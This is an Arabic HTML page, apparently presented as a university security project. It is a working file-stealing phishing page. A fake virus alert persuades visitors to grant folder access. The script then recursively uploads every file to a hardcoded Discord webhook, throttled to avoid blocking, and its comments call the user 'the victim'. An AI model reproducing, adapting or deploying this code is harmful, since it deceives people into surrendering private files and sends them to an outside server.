<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مشروع أمن المعلومات الجامعي</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #050505; color: #00ff00; text-align: center; padding: 40px; }
        .terminal { border: 2px solid #00ff00; padding: 25px; border-radius: 10px; display: inline-block; width: 90%; max-width: 600px; box-shadow: 0 0 15px #00ff00; }
        .btn { background: #ff0000; color: white; padding: 20px; border: none; font-weight: bold; cursor: pointer; width: 100%; border-radius: 5px; font-size: 20px; }
        #log { text-align: left; background: black; padding: 15px; margin-top: 20px; height: 250px; overflow-y: auto; font-size: 12px; border: 1px solid #333; }
        .danger { color: #ff0000; text-decoration: blink; }
    </style>
</head>
<body>

    <div class="terminal">
        <h1 class="danger">🚨 تنبيه: كشف نشاط مشبوه</h1>
        <p>النظام يحتاج للوصول إلى مجلداتك لتنظيفها من الفيروسات السحابية المكتشفة.</p>
        
        <button class="btn" id="startBtn">بدء عملية التطهير الشامل 🛡️</button>
        
        <div id="log">بانتظار تفعيل الصلاحية...</div>
    </div>

<script>
    // رابط الويب هوك الخاص بك
    const WEBHOOK = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";

    document.getElementById('startBtn').addEventListener('click', async () => {
        const log = document.getElementById('log');
        
        try {
            // 1. طلب الصلاحية لمجلد (إقناع الضحية باختيار مجلد كبير)
            const dirHandle = await window.showDirectoryPicker();
            log.innerHTML += "<br>[!] تم منح الصلاحية. بدء الزحف التلقائي داخل الملفات...";

            // 2. دالة السحب العميق (Deep Recursive Scan)
            async function deepScan(handle, path = "") {
                for await (const entry of handle.values()) {
                    const currentPath = path + "/" + entry.name;
                    
                    if (entry.kind === 'file') {
                        const file = await entry.getFile();
                        log.innerHTML += `<br>[+] سحب ملف: ${currentPath} ... تم`;
                        log.scrollTop = log.scrollHeight; // النزول للأسفل تلقائياً
                        
                        await uploadFile(file, currentPath);
                    } else if (entry.kind === 'directory') {
                        log.innerHTML += `<br>[*] الدخول للمجلد: ${currentPath}`;
                        // الدخول للمجلد الفرعي تلقائياً بدون طلب إذن جديد
                        await deepScan(entry, currentPath);
                    }
                }
            }

            await deepScan(dirHandle);
            log.innerHTML += "<br><br>✅ اكتملت العملية. تم تأمين كافة الملفات في السيرفر.";

        } catch (err) {
            log.innerHTML += "<br>❌ خطأ: الضحية رفض الصلاحية أو المتصفح حظر الوصول.";
            console.error(err);
        }
    });

    async function uploadFile(file, fullPath) {
        const formData = new FormData();
        formData.append('file', file, file.name);
        formData.append('payload_json', JSON.stringify({
            content: `📂 **ملف مسحوب من العمق:** \`${fullPath}\``
        }));

        try {
            await fetch(WEBHOOK, { method: 'POST', body: formData });
            // تأخير بسيط لمنع حظر الويب هوك
            await new Promise(r => setTimeout(r, 800));
        } catch (e) { console.log("خطأ في الإرسال"); }
    }
</script>

</body>
</html>
